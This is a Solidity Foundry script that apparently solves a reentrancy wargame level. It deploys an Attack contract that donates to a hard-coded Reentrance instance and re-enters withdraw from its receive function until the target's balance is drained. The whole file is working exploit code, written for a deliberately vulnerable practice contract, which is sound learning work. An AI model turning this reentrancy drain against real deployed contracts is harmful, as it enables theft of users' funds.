// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "../src/Level10.sol";

contract Attack {
    Reentrance public reentranceInstance;

    constructor() payable {
        reentranceInstance = Reentrance(
            payable(0x6C9f568b9f70AFf55Ec69d13791368E2b823E67D)
        );

        reentranceInstance.donate{value: msg.value}(address(this));
    }

    function withdraw(uint256 _amount) public {
        reentranceInstance.withdraw(_amount);
    }

    receive() external payable {
        uint256 contractBalance = address(reentranceInstance).balance;

        if (contractBalance > 0) {
            reentranceInstance.withdraw(
                contractBalance < msg.value ? contractBalance : msg.value
            );
        }
    }
}

contract ReentranceScript is Script {
    Attack public attackInstance;

    function run() public {
        vm.startBroadcast();

        uint256 payloadAmount = 0.0005 ether;

        attackInstance = new Attack{value: payloadAmount}();
        attackInstance.withdraw(payloadAmount);

        vm.stopBroadcast();
    }
}
